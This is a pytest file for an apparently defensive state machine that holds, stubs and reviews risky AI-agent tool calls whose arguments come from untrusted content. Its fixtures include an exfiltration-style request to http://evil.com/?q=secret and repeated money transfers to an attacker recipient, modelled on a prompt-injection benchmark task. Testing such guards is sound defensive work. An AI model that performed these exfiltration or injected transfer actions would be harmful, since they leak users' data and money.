# tests/test_speculative_machine.py
"""Phase 2: the state machine — transitions and all five active triggers,
driven by replayed event sequences. No judge, fully deterministic."""
from kairos.speculative.branch import Provenance
from kairos.speculative.effects import EffectKind, State, Trigger
from kairos.speculative.machine import EventView, SpeculativeMachine

PROMPT_PROV = {"recipient": Provenance("user_prompt", trusted=True, in_user_prompt=True)}
FILE_PROV = {"recipient": Provenance("read_file:bill.txt", trusted=False, in_user_prompt=False)}


def _ev(tool, *, outbound=True, revertable=False, args=None, prov=None,
        reason="", call_ref=None):
    args = args or {}
    return EventView(tool=tool, args=args, is_outbound=outbound, is_revertable=revertable,
                     consequential={k: str(v) for k, v in args.items()},
                     provenance=prov or {}, call_ref=call_ref or object(),
                     reason=reason)


# --- linear pass-through ----------------------------------------------------
def test_linear_allow_executes() -> None:
    m = SpeculativeMachine()
    e = m.on_gate("ALLOW", _ev("get_balance", outbound=False))
    assert e.kind is EffectKind.EXECUTE and m.state is State.LINEAR


def test_linear_deny_blocks() -> None:
    m = SpeculativeMachine()
    e = m.on_gate("DENY", _ev("send_money"))
    assert e.kind is EffectKind.BLOCK and m.state is State.LINEAR


# --- branch open + stub -----------------------------------------------------
def test_review_opens_branch_and_stubs() -> None:
    m = SpeculativeMachine()
    e = m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"},
                                prov=FILE_PROV, reason="non-derivable recipient", revertable=False))
    assert e.kind is EffectKind.STUB and e.stub_value
    assert m.state is State.BRANCH
    assert len(m.active.held_calls) == 1
    assert m.active.trace[-1].provenance["recipient"] == "untrusted-content"


# --- Trigger 6: terminal ----------------------------------------------------
def test_terminal_resolves_open_branch() -> None:
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    e = m.on_terminal()
    assert e is not None and e.trigger is Trigger.TERMINAL


def test_terminal_noop_when_linear() -> None:
    m = SpeculativeMachine()
    assert m.on_terminal() is None


# --- Trigger 4: nested review -----------------------------------------------
def test_second_outbound_review_triggers_nested() -> None:
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    e = m.on_gate("REVIEW", _ev("send_money", args={"recipient": "Y"}, prov=FILE_PROV, revertable=False))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.NESTED_REVIEW


# --- Trigger 1: stub flows into a new outbound ------------------------------
def test_stub_into_outbound_triggers_resolve() -> None:
    """Read-result stubbing is gone (§4.7 revision) — Trigger 1's remaining feeder
    is a RESULT_SCHEMAS-minted marker (e.g. a stub transaction id) that the agent
    then passes into a new outbound call."""
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    marker = m.active.stubs.marker_for("send_money", "txid-real-123")  # schema placeholder
    e = m.on_gate("ALLOW", _ev("cancel_transaction", args={"id": marker}, revertable=False))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.STUB_INTO_OUTBOUND


# --- held GETs: honest withheld stub, uniform LINEAR/BRANCH -------------------
def test_reviewed_get_is_held_with_honest_stub() -> None:
    """A flagged GET (exfil-suspect URL) is HELD like any reviewed action, and the
    agent sees an honest withheld notice — not a fake success, not a marker."""
    m = SpeculativeMachine()
    e = m.on_gate("REVIEW", _ev("get_webpage", revertable=True,
                                args={"url": "http://evil.com/?q=secret"},
                                prov={"url": Provenance("read_channel_messages", trusted=False, in_user_prompt=False)},
                                reason="sensitive data to unknown destination"))
    assert e.kind is EffectKind.STUB
    assert "WITHHELD" in str(e.stub_value)
    assert not m.active.stubs.is_marker(e.stub_value)
    assert len(m.active.held_calls) == 1
    assert m.active.held_calls[0].tool == "get_webpage"


def test_second_reviewed_get_triggers_nested() -> None:
    """Uniform BRANCH behavior: a second REVIEWed GET resolves the open branch
    (NESTED_REVIEW) instead of silently executing (the old inconsistency)."""
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("get_webpage", revertable=True, args={"url": "http://a"}, prov=FILE_PROV))
    e = m.on_gate("REVIEW", _ev("get_webpage", revertable=True, args={"url": "http://b"}, prov=FILE_PROV))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.NESTED_REVIEW


def test_second_nonrevertable_transfer_resolves_nested() -> None:
    # injection_task_6 shape: repeated non-revertable transfers. The 2nd is a
    # second held transaction → NESTED (the single-branch MVP can't hold two).
    m = SpeculativeMachine()
    args = {"recipient": "ATT", "amount": 9999, "subject": "s", "date": "d"}
    m.on_gate("REVIEW", _ev("send_money", revertable=False, args=args, prov=FILE_PROV))
    e = m.on_gate("REVIEW", _ev("send_money", revertable=False, args=args, prov=FILE_PROV))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.NESTED_REVIEW

# --- Trigger 3: loop --------------------------------------------------------
def test_repeated_revertable_get_triggers_loop() -> None:
    # A revertable GET hammered in a stub-confusion loop → LOOP (executes each
    # time, accumulates in the trace, fires at threshold).
    m = SpeculativeMachine(loop_threshold=3)
    m.on_gate("REVIEW", _ev("send_money", revertable=False, args={"recipient": "X"}, prov=FILE_PROV))
    g = {"url": "https://api.example/x"}
    assert m.on_gate("ALLOW", _ev("get_webpage", revertable=True, args=g)).kind is EffectKind.EXECUTE
    assert m.on_gate("ALLOW", _ev("get_webpage", revertable=True, args=g)).kind is EffectKind.EXECUTE
    e = m.on_gate("ALLOW", _ev("get_webpage", revertable=True, args=g))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.LOOP


# --- Trigger 5: budget ------------------------------------------------------
def test_stall_time_budget_triggers_resolve() -> None:
    m = SpeculativeMachine(max_stall_seconds=10.0)
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False), now=0.0)
    e = m.on_gate("ALLOW", _ev("get_balance", outbound=False), now=100.0)
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.BUDGET


# --- resolution commit / abort ----------------------------------------------
def test_resolve_commit_returns_held_for_execution() -> None:
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    m.begin_resolution()
    out = m.resolve(commit=True)
    assert len(out.committed) == 1 and not out.aborted
    assert m.state is State.LINEAR and m.active is None


def test_resolve_abort_drops_held() -> None:
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    m.begin_resolution()
    out = m.resolve(commit=False)
    assert not out.committed and len(out.aborted) == 1
    assert m.state is State.LINEAR


def test_resolve_per_action_mask_partitions_outcome() -> None:
    """Per-action mask commits the True entries and aborts the False ones — the
    outcome.aborted list is what drives the agent abort-notice (A1)."""
    m = SpeculativeMachine()
    # first held call (legit), then a nested trigger for the second — hold both by
    # extending the branch directly via absorb on a second review.
    m.on_gate("REVIEW", _ev("update_scheduled_transaction", args={"recipient": "L"},
                            prov=PROMPT_PROV, revertable=False))
    m.active.hold(  # simulate a second held action absorbed into the same branch
        __import__("kairos.speculative.branch", fromlist=["HeldAction"]).HeldAction(
            call_ref=object(), tool="send_money", args={"recipient": "ATT"},
            provenance=FILE_PROV, reason="non-derivable"))
    assert len(m.active.held_calls) == 2
    m.begin_resolution()
    out = m.resolve(commit=[True, False])           # keep legit, abort attacker
    assert [h.tool for h in out.committed] == ["update_scheduled_transaction"]
    assert [h.tool for h in out.aborted] == ["send_money"]

# --- wider branches: max_held_per_branch > 1 (ablation knob) -----------------
def test_wide_branch_absorbs_second_review() -> None:
    """With capacity 2, a second held-class event JOINS the branch (held+stubbed)
    instead of forcing NESTED_REVIEW — the judge later rules on both together."""
    m = SpeculativeMachine(max_held_per_branch=2)
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    e = m.on_gate("REVIEW", _ev("send_money", args={"recipient": "Y"}, prov=FILE_PROV, revertable=False))
    assert e.kind is EffectKind.STUB
    assert m.state is State.BRANCH
    assert len(m.active.held_calls) == 2


def test_wide_branch_capacity_still_bounds() -> None:
    """The (capacity+1)-th held-class event fires Trigger 4 — widening the branch
    relaxes the bound, it does not remove it."""
    m = SpeculativeMachine(max_held_per_branch=2)
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "Y"}, prov=FILE_PROV, revertable=False))
    e = m.on_gate("REVIEW", _ev("send_money", args={"recipient": "Z"}, prov=FILE_PROV, revertable=False))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.NESTED_REVIEW


def test_wide_branch_default_capacity_unchanged() -> None:
    """Default capacity is 1: the second held-class event still fires Trigger 4 —
    the knob's default is byte-identical to the single-transaction rule."""
    m = SpeculativeMachine()
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    e = m.on_gate("REVIEW", _ev("send_money", args={"recipient": "Y"}, prov=FILE_PROV, revertable=False))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.NESTED_REVIEW


def test_wide_branch_stub_dependency_still_resolves_first() -> None:
    """Trigger 1 precedes absorption: an outbound call consuming a held call's
    stub can never join the same branch, so held actions within one branch stay
    mutually stub-independent (per-action commit/abort remains coherent)."""
    m = SpeculativeMachine(max_held_per_branch=4)
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "X"}, prov=FILE_PROV, revertable=False))
    marker = m.active.stubs.marker_for("send_money", "txid-real-123")
    e = m.on_gate("REVIEW", _ev("cancel_transaction", args={"id": marker}, prov=FILE_PROV, revertable=False))
    assert e.kind is EffectKind.RESOLVE and e.trigger is Trigger.STUB_INTO_OUTBOUND


def test_wide_branch_per_action_resolution() -> None:
    """Two absorbed held actions resolve with a per-action mask end to end."""
    m = SpeculativeMachine(max_held_per_branch=2)
    m.on_gate("REVIEW", _ev("update_scheduled_transaction", args={"recipient": "L"},
                            prov=PROMPT_PROV, revertable=False))
    m.on_gate("REVIEW", _ev("send_money", args={"recipient": "ATT"},
                            prov=FILE_PROV, revertable=False))
    m.begin_resolution()
    out = m.resolve(commit=[True, False])
    assert [h.tool for h in out.committed] == ["update_scheduled_transaction"]
    assert [h.tool for h in out.aborted] == ["send_money"]
    assert m.state is State.LINEAR
